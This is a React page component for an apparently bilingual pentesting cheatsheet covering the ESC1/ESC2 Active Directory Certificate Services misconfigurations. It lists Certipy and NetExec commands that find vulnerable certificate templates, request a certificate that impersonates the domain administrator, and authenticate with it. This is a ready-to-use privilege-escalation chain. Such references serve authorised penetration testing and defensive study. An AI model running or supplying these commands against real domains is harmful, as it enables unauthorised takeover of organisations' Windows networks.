"use client";

import { useLanguage } from "@/components/LanguageProvider";
import { CheatsheetCommandCard } from "@/components/CheatsheetCommandCard";

export default function Esc1Esc2Page() {
  const { lang } = useLanguage();
  const entries = [
    { cmd: "certipy find -u '$USER@$DOMAIN' -p '$PASS' -dc-ip $DC -vulnerable", why: lang === "fr" ? "Détecter templates vulnérables ESC1/ESC2." : "Detect ESC1/ESC2 vulnerable templates." },
    { cmd: "certipy req -u '$USER@$DOMAIN' -p '$PASS' -ca '$CA' -template '$TEMPLATE' -upn administrator@$DOMAIN", why: lang === "fr" ? "Abuser SAN/UPN si template le permet." : "Abuse SAN/UPN when template allows it." },
    { cmd: "certipy auth -pfx administrator.pfx -dc-ip $DC", why: lang === "fr" ? "Authentifier avec certificat compromis." : "Authenticate with compromised certificate." },
    { cmd: "nxc ldap $TARGET -u $USER -p $PASS -M adcs", why: lang === "fr" ? "Croiser résultat Certipy avec enum LDAP ADCS." : "Cross-check Certipy output with LDAP ADCS enum." },
  ];

  return (
    <div className="mx-auto max-w-3xl px-6 py-10 lg:px-10">
      <header className="mb-8 border-b border-border pb-6">
        <p className="mb-2 text-[11px] font-mono uppercase tracking-widest text-primary">ESC</p>
        <h1 className="text-2xl font-semibold tracking-tight text-foreground sm:text-3xl">ESC1 / ESC2</h1>
      </header>
      <section className="space-y-4">
        {entries.map((item) => <CheatsheetCommandCard key={item.cmd} cmd={item.cmd} why={item.why} lang={lang} />)}
      </section>
    </div>
  );
}
